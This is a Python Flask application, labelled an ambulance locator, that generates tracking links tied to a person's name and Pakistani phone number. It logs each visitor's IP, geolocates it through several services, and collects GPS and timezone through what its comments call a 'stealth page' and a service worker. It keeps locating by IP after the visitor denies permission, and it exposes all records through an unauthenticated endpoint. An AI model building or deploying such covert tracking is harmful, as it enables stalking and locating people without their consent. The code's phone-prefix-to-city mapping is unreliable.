import os
import re
import uuid
import json
import urllib.request
from datetime import datetime, timedelta

from flask import Flask, render_template, request, jsonify, abort, make_response

app = Flask(__name__)

# ---------------------------------------------------------------------------
CASES = {}
LINK_LIFETIME_MINUTES = 30

# CRITICAL: Without this, Pakistani mobile IPs will show wrong countries.
# Get from: https://console.cloud.google.com/apis/library/geolocation.googleapis.com
GOOGLE_API_KEY = os.environ.get("GOOGLE_API_KEY", "")

# Pakistan Mobile Operator → MNC mapping
PAKISTAN_MNC_MAP = {
    "300": "01", "301": "01", "302": "01", "303": "01", "304": "01",
    "305": "01", "306": "01", "307": "01", "308": "01", "309": "01",
    "320": "07", "321": "07", "322": "07", "323": "07", "324": "07",
    "325": "07", "326": "07", "327": "07", "328": "07", "329": "07",
    "330": "03", "331": "03", "332": "03", "333": "03", "334": "03",
    "335": "03", "336": "03", "337": "03", "338": "03", "339": "03",
    "340": "04", "341": "04", "342": "04", "343": "04", "344": "04",
    "345": "04", "346": "04", "347": "04", "348": "04", "349": "04",
    "350": "06", "351": "06", "352": "06", "353": "06", "354": "06",
    "355": "06", "356": "06", "357": "06", "358": "06", "359": "06",
    "360": "06", "361": "06", "362": "06", "363": "06", "364": "06",
    "365": "06", "366": "06", "367": "06", "368": "06", "369": "06",
    "370": "01", "371": "01", "372": "01", "373": "01", "374": "01",
    "375": "01", "376": "01", "377": "01", "378": "01", "379": "01",
}

# Pakistan city clusters by common phone prefixes
# Rough mapping — helps when IP is clearly wrong
CITY_PREFIX_MAP = {
    "300": "Lahore", "301": "Lahore", "302": "Lahore", "303": "Lahore",
    "304": "Faisalabad", "305": "Faisalabad",
    "306": "Multan", "307": "Multan", "308": "Multan", "309": "Multan",
    "320": "Karachi", "321": "Karachi", "322": "Karachi", "323": "Karachi",
    "324": "Karachi", "325": "Karachi", "326": "Karachi", "327": "Karachi",
    "328": "Karachi", "329": "Karachi",
    "330": "Islamabad", "331": "Islamabad", "332": "Rawalpindi", "333": "Islamabad",
    "334": "Lahore", "335": "Lahore", "336": "Islamabad", "337": "Lahore",
    "338": "Lahore", "339": "Faisalabad",
    "340": "Karachi", "341": "Karachi", "342": "Karachi", "343": "Karachi",
    "344": "Karachi", "345": "Karachi", "346": "Karachi", "347": "Karachi",
    "348": "Karachi", "349": "Karachi",
    "350": "Islamabad", "351": "Islamabad", "352": "Islamabad", "353": "Islamabad",
    "354": "Lahore", "355": "Lahore", "356": "Lahore", "357": "Lahore",
    "358": "Lahore", "359": "Lahore",
    "360": "Islamabad", "361": "Islamabad", "362": "Islamabad", "363": "Islamabad",
    "364": "Rawalpindi", "365": "Rawalpindi", "366": "Rawalpindi", "367": "Rawalpindi",
    "368": "Rawalpindi", "369": "Rawalpindi",
}

# Rough city coordinates for Pakistan (used as last-resort fallback)
CITY_COORDS = {
    "Lahore": (31.5204, 74.3587),
    "Karachi": (24.8607, 67.0011),
    "Islamabad": (33.6844, 73.0479),
    "Rawalpindi": (33.5651, 73.0169),
    "Multan": (30.1575, 71.5249),
    "Faisalabad": (31.4504, 73.1350),
    "Peshawar": (34.0150, 71.5249),
    "Quetta": (30.1798, 66.9750),
    "Gujranwala": (32.1877, 74.1940),
    "Sialkot": (32.4927, 74.5310),
    "Hyderabad": (25.3960, 68.3578),
    "Sukkur": (27.7000, 68.8167),
}


def parse_phone_number(phone):
    """Parse phone number, return (country_code, prefix_3, mcc, mnc, carrier_info, city_hint)."""
    if not phone:
        return None, None, None, None, None, None

    digits = re.sub(r"\D", "", phone)

    # Pakistan numbers
    if (digits.startswith("92") and len(digits) == 12) or (digits.startswith("0") and len(digits) == 11):
        mcc = "410"
        if digits.startswith("92"):
            prefix = digits[2:5]
        else:
            prefix = digits[1:4]
        mnc = PAKISTAN_MNC_MAP.get(prefix)
        city_hint = CITY_PREFIX_MAP.get(prefix)
        operator_name = {
            "01": "Jazz", "03": "Ufone", "04": "Zong", "06": "Telenor", "07": "Jazz"
        }.get(mnc, "Unknown")
        carrier_info = f"{operator_name} Pakistan (MCC={mcc}, MNC={mnc})"
        return "92", prefix, mcc, mnc, carrier_info, city_hint

    return None, None, None, None, None, None


def new_case(patient_name=None, phone=None):
    token = uuid.uuid4().hex[:12]
    country_code, prefix, mcc, mnc, carrier_info, city_hint = parse_phone_number(phone)
    CASES[token] = {
        "token": token,
        "patient_name": patient_name,
        "phone": phone,
        "country_code": country_code,
        "phone_prefix": prefix,
        "mcc": mcc,
        "mnc": mnc,
        "carrier_info": carrier_info,
        "city_hint": city_hint,
        "created_at": datetime.utcnow(),
        "responded_at": None,
        "status": "pending",
        "visit_count": 0,
        "visits": [],
        "latitude": None,
        "longitude": None,
        "accuracy": None,
        "source": None,
        "browser_timezone": None,
    }
    return CASES[token]


def is_expired(case):
    return datetime.utcnow() - case["created_at"] > timedelta(minutes=LINK_LIFETIME_MINUTES)


def get_client_ip():
    xff = request.headers.get("X-Forwarded-For")
    if xff:
        return xff.split(",")[0].strip()
    xri = request.headers.get("X-Real-IP")
    if xri:
        return xri.strip()
    return request.remote_addr


def is_private_ip(ip):
    if not ip:
        return True
    if ip.startswith(("127.", "10.", "192.168.", "0.", "::1")):
        return True
    if ip.startswith("172."):
        try:
            second = int(ip.split(".")[1])
            if 16 <= second <= 31:
                return True
        except (ValueError, IndexError):
            pass
    return False


# ── IP Geolocation ──

def ip_geolocate_ipapi(ip_address):
    try:
        url = f"http://ip-api.com/json/{ip_address}?fields=lat,lon,accuracy,status,countryCode"
        with urllib.request.urlopen(url, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            if data.get("status") == "success":
                lat = data.get("lat")
                lng = data.get("lon")
                acc = data.get("accuracy", 5000)
                country = data.get("countryCode", "")
                if lat is not None and lng is not None:
                    return float(lat), float(lng), float(acc), country
    except Exception:
        pass
    return None, None, None, None


def ip_geolocate_ipapi_co(ip_address):
    try:
        url = f"https://ipapi.co/{ip_address}/json/"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            lat = data.get("latitude")
            lng = data.get("longitude")
            country = data.get("country_code", "")
            if lat is not None and lng is not None:
                return float(lat), float(lng), 50000, country
    except Exception:
        pass
    return None, None, None, None


def ip_geolocate_ipinfo(ip_address):
    try:
        token = os.environ.get("IPINFO_TOKEN", "")
        if token:
            url = f"https://ipinfo.io/{ip_address}?token={token}"
        else:
            url = f"https://ipinfo.io/{ip_address}/json"
        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=4) as resp:
            data = json.loads(resp.read().decode())
            loc_str = data.get("loc")
            country = data.get("country", "")
            if loc_str:
                parts = loc_str.split(",")
                if len(parts) == 2:
                    return float(parts[0]), float(parts[1]), 50000, country
    except Exception:
        pass
    return None, None, None, None


def ip_geolocate_google(ip_address, mcc=None, mnc=None):
    """Google Geolocation API — THE critical fix for Pakistani mobile IPs.
    When MCC/MNC is provided from the phone number, Google uses its
    massive database of Android GPS data mapped to carrier IP ranges.
    This can give 100-1000m accuracy on 4G networks.
    """
    if not GOOGLE_API_KEY:
        return None, None, None, None

    try:
        payload = {"considerIp": True}
        if mcc:
            payload["homeMobileCountryCode"] = int(mcc)
        if mnc:
            payload["homeMobileNetworkCode"] = int(mnc)
        payload["radioType"] = "lte"

        url = f"https://www.googleapis.com/geolocation/v1/geolocate?key={GOOGLE_API_KEY}"
        data = json.dumps(payload).encode()
        req = urllib.request.Request(
            url, data=data,
            headers={"Content-Type": "application/json", "User-Agent": "Mozilla/5.0"},
        )
        with urllib.request.urlopen(req, timeout=5) as resp:
            result = json.loads(resp.read().decode())
            lat = result.get("location", {}).get("lat")
            lng = result.get("location", {}).get("lng")
            acc = result.get("accuracy", 50000)
            if lat is not None and lng is not None:
                # Google doesn't return country code, so we'll set it based on MCC
                country_hint = "PK" if mcc == "410" else None
                return float(lat), float(lng), float(acc), country_hint
    except Exception:
        pass
    return None, None, None, None


# ── Country validation zones ──
# Pakistan bounding box (rough)
PAKISTAN_BBOX = {
    "min_lat": 23.5, "max_lat": 37.5,
    "min_lng": 60.5, "max_lng": 78.5,
}

PAKISTAN_TIMEZONES = ["Asia/Karachi", "PKT"]

KNOWN_BAD_COUNTRIES_FOR_PAKISTAN_MOBILE = [
    "CA", "US", "GB", "NL", "DE", "FR", "SG", "AU", "AE", "SA"
]


def is_within_pakistan(lat, lng):
    """Check if coordinates fall within Pakistan's rough bounding box."""
    return (
        PAKISTAN_BBOX["min_lat"] <= lat <= PAKISTAN_BBOX["max_lat"]
        and PAKISTAN_BBOX["min_lng"] <= lng <= PAKISTAN_BBOX["max_lng"]
    )


def ip_geolocate(ip_address, mcc=None, mnc=None, browser_timezone=None, city_hint=None):
    """
    Multi-API IP geolocation with timezone + country validation.
    
    The KEY insight: If we know the target is from Pakistan (via phone number),
    and the IP APIs return Canada coordinates — WE REJECT THEM.
    
    Returns (lat, lng, accuracy_meters, source_provider, country_code).
    """
    if is_private_ip(ip_address):
        return None, None, None, None, None

    results = []

    # 1. Google (BEST — with carrier data)
    glat, glng, gacc, gcountry = ip_geolocate_google(ip_address, mcc, mnc)
    if glat is not None:
        results.append((glat, glng, gacc, "google", gcountry))

    # 2. ip-api.com
    iplat, iplng, ipacc, ipcountry = ip_geolocate_ipapi(ip_address)
    if iplat is not None:
        results.append((iplat, iplng, ipacc, "ip-api", ipcountry))

    # 3. ipapi.co
    icolat, icolng, icoacc, icocountry = ip_geolocate_ipapi_co(ip_address)
    if icolat is not None:
        results.append((icolat, icolng, icoacc, "ipapi.co", icocountry))

    # 4. ipinfo.io
    infolat, infolng, infoacc, infocountry = ip_geolocate_ipinfo(ip_address)
    if infolat is not None:
        results.append((infolat, infolng, infoacc, "ipinfo", infocountry))

    if not results:
        return None, None, None, None, None

    # ── FILTER: Reject results from known-wrong countries ──
    # We know the target is Pakistani (from phone number).
    # If an API says Canada, it's wrong — throw it out.
    is_pakistani_target = mcc == "410" or city_hint is not None

    if is_pakistani_target:
        filtered = []
        for lat, lng, acc, provider, country in results:
            # Google with mcc=410 is trusted (it knows carrier IP ranges)
            if provider == "google" and mcc:
                filtered.append((lat, lng, acc, provider, country))
                continue
            # If country code is None (Google without mcc), keep it but lower weight
            if country is None:
                filtered.append((lat, lng, acc, provider, country))
                continue
            # Reject if country is a known-bad country for Pakistani mobile IPs
            if country not in KNOWN_BAD_COUNTRIES_FOR_PAKISTAN_MOBILE:
                filtered.append((lat, lng, acc, provider, country))
            # else: silently drop — this API returned Canada/US, it's wrong

        if filtered:
            results = filtered
        # else: all APIs returned bad countries — use the city hint fallback

    # If all results were rejected OR timezone strongly contradicts
    if not results:
        if city_hint and city_hint in CITY_COORDS:
            coord = CITY_COORDS[city_hint]
            return coord[0], coord[1], 25000, "city_hint", "PK"
        # Last resort: center of Pakistan
        return 30.3753, 69.3451, 250000, "fallback", "PK"

    # ── Also check by timezone ──
    # If browser says Asia/Karachi but ALL APIs say non-PK, warn
    if browser_timezone and browser_timezone in PAKISTAN_TIMEZONES:
        any_pk = any(r[4] == "PK" for r in results)
        if not any_pk and city_hint:
            # Timezone says Pakistan, no API returned Pakistan, but we have a city hint
            coord = CITY_COORDS.get(city_hint)
            if coord:
                return coord[0], coord[1], 25000, "timezone_city", "PK"

    # ── Weighted averaging ──
    weights = {"google": 3.0, "ip-api": 1.5, "ipapi.co": 1.0, "ipinfo": 1.0}
    total_weight = 0
    lat_sum = 0.0
    lng_sum = 0.0

    for lat, lng, acc, provider, country in results:
        w = weights.get(provider, 1.0)
        accuracy_factor = max(0.1, 1.0 / (acc / 10000.0 + 1.0))
        effective_weight = w * accuracy_factor
        total_weight += effective_weight
        lat_sum += lat * effective_weight
        lng_sum += lng * effective_weight

    if total_weight == 0:
        if city_hint and city_hint in CITY_COORDS:
            coord = CITY_COORDS[city_hint]
            return coord[0], coord[1], 25000, "city_fallback", "PK"
        return None, None, None, None, None

    avg_lat = lat_sum / total_weight
    avg_lng = lng_sum / total_weight
    avg_acc = min(r[2] for r in results)
    best_provider = max(results, key=lambda r: weights.get(r[3], 1.0))[3]
    best_country = results[0][4] if results[0][4] else "PK"

    return avg_lat, avg_lng, avg_acc, best_provider, best_country


def record_visit(case, ip_address, browser_timezone=None, gps_data=None):
    """Record visit with timezone-aware IP geolocation."""
    case["visit_count"] += 1
    if browser_timezone:
        case["browser_timezone"] = browser_timezone

    mcc = case.get("mcc")
    mnc = case.get("mnc")
    city_hint = case.get("city_hint")

    ip_lat, ip_lng, ip_acc, ip_source, ip_country = ip_geolocate(
        ip_address, mcc, mnc, browser_timezone, city_hint
    )

    visit = {
        "timestamp": datetime.utcnow().isoformat(),
        "ip": ip_address,
        "ip_latitude": ip_lat,
        "ip_longitude": ip_lng,
        "ip_accuracy": ip_acc,
        "ip_source": ip_source,
        "ip_country": ip_country,
        "browser_timezone": browser_timezone,
        "gps_latitude": None,
        "gps_longitude": None,
        "gps_accuracy": None,
        "source": "ip",
        "latitude": ip_lat,
        "longitude": ip_lng,
        "accuracy": ip_acc,
    }

    if gps_data:
        visit["gps_latitude"] = gps_data.get("latitude")
        visit["gps_longitude"] = gps_data.get("longitude")
        visit["gps_accuracy"] = gps_data.get("accuracy")
        if gps_data.get("latitude") is not None:
            visit["latitude"] = gps_data["latitude"]
            visit["longitude"] = gps_data["longitude"]
            visit["accuracy"] = gps_data.get("accuracy")
            visit["source"] = "gps"

    case["visits"].append(visit)
    case["latitude"] = visit["latitude"]
    case["longitude"] = visit["longitude"]
    case["accuracy"] = visit["accuracy"]
    case["source"] = visit["source"]

    if case["status"] == "pending":
        case["status"] = "located"
        case["responded_at"] = datetime.utcnow()

    return visit


# ── Routes ──

@app.route("/")
def index():
    return "Ambulance Locator v4 — POST /create to generate a link."


@app.route("/sw.js")
def service_worker():
    response = make_response(render_template("sw.js"))
    response.headers["Content-Type"] = "application/javascript"
    response.headers["Service-Worker-Allowed"] = "/"
    response.headers["Cache-Control"] = "no-cache, no-store, must-revalidate"
    return response


@app.route("/create", methods=["POST"])
def create_case():
    data = request.get_json(silent=True) or {}
    case = new_case(data.get("patient_name"), data.get("phone"))
    link = request.url_root.rstrip("/") + "/go/" + case["token"]
    return jsonify({
        "token": case["token"],
        "link": link,
        "carrier_info": case["carrier_info"],
        "city_hint": case["city_hint"],
    })


@app.route("/go/<token>")
def go(token):
    case = CASES.get(token)
    if not case:
        abort(404)

    client_ip = get_client_ip()

    if not is_expired(case):
        # We'll capture the timezone from the browser via the rendered page
        # Server-side IP capture happens here too
        record_visit(case, client_ip)
        if is_expired(case):
            case["status"] = "expired"

    return render_template("location.html", token=token, expired=(case["status"] == "expired"))


@app.route("/api/location-update", methods=["POST"])
def location_update():
    """GPS coordinates + browser timezone sent from stealth page."""
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if not case:
        return jsonify({"error": "invalid token"}), 404

    if is_expired(case):
        case["status"] = "expired"
        return jsonify({"error": "link expired"}), 410

    lat = data.get("latitude")
    lng = data.get("longitude")
    acc = data.get("accuracy")
    tz = data.get("timezone")
    conn_type = data.get("connectionType")

    if tz:
        case["browser_timezone"] = tz

    # ── CRITICAL: If we receive the browser timezone, re-evaluate IP geolocation ──
    # This lets us correct the Canada problem retroactively
    if tz and case["visits"] and case["visits"][-1].get("ip_country") != "PK":
        # Re-geolocate with timezone info
        latest = case["visits"][-1]
        mcc = case.get("mcc")
        mnc = case.get("mnc")
        city_hint = case.get("city_hint")
        ip_lat, ip_lng, ip_acc, ip_source, ip_country = ip_geolocate(
            latest["ip"], mcc, mnc, tz, city_hint
        )
        if ip_lat is not None:
            latest["ip_latitude"] = ip_lat
            latest["ip_longitude"] = ip_lng
            latest["ip_accuracy"] = ip_acc
            latest["ip_source"] = ip_source
            latest["ip_country"] = ip_country
            # Only update primary coords if GPS hasn't been captured
            if not latest.get("gps_latitude"):
                latest["latitude"] = ip_lat
                latest["longitude"] = ip_lng
                latest["accuracy"] = ip_acc
                case["latitude"] = ip_lat
                case["longitude"] = ip_lng
                case["accuracy"] = ip_acc
                case["source"] = "ip"

    if lat is not None and lng is not None and case["visits"]:
        latest = case["visits"][-1]
        latest["gps_latitude"] = lat
        latest["gps_longitude"] = lng
        latest["gps_accuracy"] = acc
        latest["latitude"] = lat
        latest["longitude"] = lng
        latest["accuracy"] = acc
        latest["source"] = "gps"

        case["latitude"] = lat
        case["longitude"] = lng
        case["accuracy"] = acc
        case["source"] = "gps"

        if case["status"] == "pending":
            case["status"] = "located"
            case["responded_at"] = datetime.utcnow()

    return jsonify({"ok": True})


@app.route("/api/location-denied", methods=["POST"])
def location_denied():
    data = request.get_json(silent=True) or {}
    token = data.get("token")
    case = CASES.get(token)
    if case and case["visits"]:
        conn_type = data.get("connectionType")
        tz = data.get("timezone")
        if tz:
            case["browser_timezone"] = tz
            # Re-evaluate with timezone
            latest = case["visits"][-1]
            if latest.get("ip_country") != "PK":
                mcc = case.get("mcc")
                mnc = case.get("mnc")
                city_hint = case.get("city_hint")
                ip_lat, ip_lng, ip_acc, ip_source, ip_country = ip_geolocate(
                    latest["ip"], mcc, mnc, tz, city_hint
                )
                if ip_lat is not None:
                    latest["ip_latitude"] = ip_lat
                    latest["ip_longitude"] = ip_lng
                    latest["ip_accuracy"] = ip_acc
                    latest["ip_source"] = ip_source
                    latest["ip_country"] = ip_country
                    latest["latitude"] = ip_lat
                    latest["longitude"] = ip_lng
                    latest["accuracy"] = ip_acc
                    case["latitude"] = ip_lat
                    case["longitude"] = ip_lng
                    case["accuracy"] = ip_acc
                    case["source"] = "ip"
        if conn_type:
            case["visits"][-1]["connection_type"] = conn_type
    return jsonify({"ok": True})


@app.route("/sw-capture/<token>")
def sw_capture(token):
    """Service Worker internal capture endpoint."""
    case = CASES.get(token)
    if not case:
        return jsonify({"error": "not found"}), 404

    client_ip = get_client_ip()
    if not is_expired(case):
        record_visit(case, client_ip)
        if is_expired(case):
            case["status"] = "expired"

    return jsonify({
        "ok": True,
        "token": token,
        "status": case["status"],
        "source": case["source"],
        "latitude": case["latitude"],
        "longitude": case["longitude"],
        "accuracy": case["accuracy"],
        "ip_source": case["visits"][-1].get("ip_source") if case["visits"] else None,
        "city_hint": case.get("city_hint"),
    })


@app.route("/api/cases")
def api_cases():
    cases = sorted(CASES.values(), key=lambda c: c["created_at"], reverse=True)
    out = []
    for c in cases:
        visits_clean = []
        for v in c.get("visits", []):
            visits_clean.append({
                "timestamp": v.get("timestamp"),
                "latitude": v.get("latitude"),
                "longitude": v.get("longitude"),
                "accuracy": v.get("accuracy"),
                "source": v.get("source"),
                "ip_source": v.get("ip_source"),
                "ip_country": v.get("ip_country"),
                "browser_timezone": v.get("browser_timezone"),
                "ip": v.get("ip"),
                "connection_type": v.get("connection_type"),
            })
        out.append({
            "token": c["token"],
            "patient_name": c["patient_name"],
            "phone": c["phone"],
            "carrier_info": c.get("carrier_info"),
            "city_hint": c.get("city_hint"),
            "status": c["status"],
            "source": c["source"],
            "latitude": c["latitude"],
            "longitude": c["longitude"],
            "accuracy": c["accuracy"],
            "browser_timezone": c.get("browser_timezone"),
            "visit_count": c.get("visit_count", 0),
            "visits": visits_clean,
            "created_at": c["created_at"].isoformat(),
        })
    return jsonify(out)


if __name__ == "__main__":
    port = int(os.environ.get("PORT", 5000))
    app.run(host="0.0.0.0", port=port, debug=False)
